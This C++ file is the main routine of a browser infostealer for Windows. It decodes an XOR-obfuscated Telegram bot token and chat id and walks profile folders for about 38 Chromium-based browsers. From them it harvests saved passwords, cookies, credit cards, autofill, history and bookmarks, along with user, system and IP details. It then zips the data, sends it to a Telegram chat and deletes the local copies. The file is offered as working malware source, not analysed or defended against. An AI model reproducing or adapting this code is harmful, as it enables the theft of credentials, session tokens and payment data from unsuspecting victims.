#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <filesystem>
#include <vector>
#include <memory>
#include <Shlobj.h>

#include "DataRetriever.h"
#include "Utilities.h"
#include "TelegramMessageSender.h"
#include "BrowserInfo.h"
#include "Compression.h"

namespace fs = std::filesystem;

std::string xorDecrypt(const std::vector<uint8_t>& data, uint8_t key, size_t offset, size_t length) {
    std::string result;
    result.reserve(length);
    for (size_t i = offset; i < offset + length; ++i) {
        result += static_cast<char>(data[i] ^ key);
    }
    return result;
}

int wmain() {
    try {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return 1;
        }

        const std::vector<uint8_t> BotToken = { /* e.g. 0x2d, 0x10, 0x1c, 0x1b */ };
        const std::vector<uint8_t> ChatId = { /* e.g. 0x17, 0x17, 0x0c */ };
        if (BotToken.empty() || ChatId.empty()) {
            WSACleanup();
            return 1;
        }

        const uint8_t obfuscatedKey = 0x5F;
        const uint8_t key = obfuscatedKey ^ 0x2A;

        const std::string botTokenStr = xorDecrypt(BotToken, key, 1, BotToken.size() - 2);
        const std::string chatIdStr = xorDecrypt(ChatId, key, 1, ChatId.size() - 2);
        std::wstring botTokenW = stringToWString(botTokenStr);
        std::wstring chatIdW = stringToWString(chatIdStr);

        std::vector<BrowserInfo> browsers = {
            {L"GoogleChrome", L"Google\\Chrome\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Edge", L"Microsoft\\Edge\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Opera", L"Opera Software\\Opera Stable", L"", L"", L"", L"", L"", L""},
            {L"UC", L"UCBrowser\\User Data", L"", L"", L"", L"", L"", L""},
            {L"360Browser", L"360Browser\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Yandex", L"Yandex\\YandexBrowser\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Brave", L"BraveSoftware\\Brave-Browser\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Vivaldi", L"Vivaldi\\User Data", L"", L"", L"", L"", L"", L""},
            {L"OperaGX", L"Opera Software\\Opera GX Stable", L"", L"", L"", L"", L"", L""},
            {L"GoogleChromeCanary", L"Google\\Chrome Canary\\User Data", L"", L"", L"", L"", L"", L""},
            {L"GoogleChromeBeta", L"Google\\Chrome Beta\\User Data", L"", L"", L"", L"", L"", L""},
            {L"GoogleChromeDev", L"Google\\Chrome Dev\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Chromium", L"Chromium\\User Data", L"", L"", L"", L"", L"", L""},
            {L"SRWareIron", L"SRWare Iron\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Avast", L"AVAST Software\\Browser\\User Data", L"", L"", L"", L"", L"", L""},
            {L"AVG", L"AVG\\Browser\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Epic", L"Epic Privacy Browser\\User Data", L"", L"", L"", L"", L"", L""},
            {L"YandexCanary", L"Yandex\\YandexBrowserCanary\\User Data", L"", L"", L"", L"", L"", L""},
            {L"YandexBeta", L"Yandex\\YandexBrowserBeta\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Slimjet", L"Slimjet\\User Data", L"", L"", L"", L"", L"", L""},
            {L"ComodoDragon", L"Comodo\\Dragon\\User Data", L"", L"", L"", L"", L"", L""},
            {L"CentBrowser", L"CentBrowser\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Torch", L"Torch\\User Data", L"", L"", L"", L"", L"", L""},
            {L"CocCoc", L"CocCoc\\Browser\\User Data", L"", L"", L"", L"", L"", L""},
            {L"NaverWhale", L"Naver\\Whale\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Falkon", L"Falkon\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Maxthon", L"Maxthon\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Iridium", L"Iridium\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Blisk", L"Blisk\\User Data", L"", L"", L"", L"", L"", L""},
            {L"YandexDeveloper", L"Yandex\\YandexBrowserDeveloper\\User Data", L"", L"", L"", L"", L"", L""},
            {L"YandexTech", L"Yandex\\YandexBrowserTech\\User Data", L"", L"", L"", L"", L"", L""},
            {L"YandexSxS", L"Yandex\\YandexBrowserSxS\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Kinza", L"Kinza\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Chedot", L"Chedot\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Kometa", L"Kometa\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Amigo", L"Amigo\\User Data", L"", L"", L"", L"", L"", L""},
            {L"Puffin", L"CloudMosa\\Puffin\\User Data", L"", L"", L"", L"", L"", L""},
            {L"GoogleChromeSxS", L"Google\\Chrome SxS\\User Data", L"", L"", L"", L"", L"", L""}
        };

        wchar_t localAppData[MAX_PATH];
        if (FAILED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData))) {
            WSACleanup();
            return 1;
        }

        setBrowserPaths(browsers, localAppData);

        DataCollector collector;
        collector.addRetriever(std::make_unique<WindowsUserRetriever>());
        collector.addRetriever(std::make_unique<SystemInfoRetriever>());
        collector.addRetriever(std::make_unique<IPAddressRetriever>());

        for (const auto& b : browsers) {
            if (!b.bookmarksPath.empty()) {
                collector.addRetriever(std::make_unique<BrowserBookmarksRetriever>(b));
            }
            if (!b.historyPath.empty()) {
                collector.addRetriever(std::make_unique<BrowserHistoryRetriever>(b));
                collector.addRetriever(std::make_unique<BrowserSearchHistoryRetriever>(b));
                collector.addRetriever(std::make_unique<BrowserDownloadHistoryRetriever>(b));
            }
            if (!b.passwordsPath.empty()) {
                collector.addRetriever(std::make_unique<BrowserPasswordsRetriever>(b));
            }
            if (!b.cookiesPath.empty()) {
                collector.addRetriever(std::make_unique<BrowserCookiesRetriever>(b));
            }
            if (!b.creditCardsPath.empty()) {
                collector.addRetriever(std::make_unique<BrowserCreditCardsRetriever>(b));
            }
            if (!b.autofillPath.empty()) {
                collector.addRetriever(std::make_unique<BrowserAutofillRetriever>(b));
            }
        }

        auto collectedData = collector.collectData();
        std::wstring tempDir = saveDataToDirectory(collectedData);

        bool hasData = false;
        for (const auto& [header, dataTypes] : collectedData) {
            if (header == L"Windows User"
                || header == L"System Information"
                || header == L"IP Address Information") {
                if (dataTypes.find(L"Content") != dataTypes.end()
                    && !dataTypes.at(L"Content").empty()) {
                    hasData = true;
                    break;
                }
                continue;
            }

            for (const auto& [dataType, content] : dataTypes) {
                if (!content.empty()) {
                    hasData = true;
                    break;
                }
            }
            if (hasData) break;
        }

        if (!hasData) {
            fs::remove_all(tempDir);
            WSACleanup();
            return 1;
        }

        std::wstring zipPath = tempDir + L".zip";
        if (!compressDirectoryToZip(tempDir, zipPath)) {
            fs::remove_all(tempDir);
            WSACleanup();
            return 1;
        }

        if (!fs::exists(zipPath)) {
            fs::remove_all(tempDir);
            WSACleanup();
            return 1;
        }

        const std::uintmax_t maxFileSize = 50 * 1024 * 1024;
        std::uintmax_t zipFileSize = fs::file_size(zipPath);
        if (zipFileSize > maxFileSize) {
            fs::remove(zipPath);
            fs::remove_all(tempDir);
            WSACleanup();
            return 1;
        }

        auto httpClient = std::make_unique<WinHTTPClient>();
        TelegramMessageSender messageSender(botTokenW, chatIdW, std::move(httpClient));
        messageSender.sendDocument(zipPath);

        DeleteFileW(zipPath.c_str());
        fs::remove_all(tempDir);
        WSACleanup();
    }
    catch (...) {
        WSACleanup();
        return 1;
    }
    return 0;
}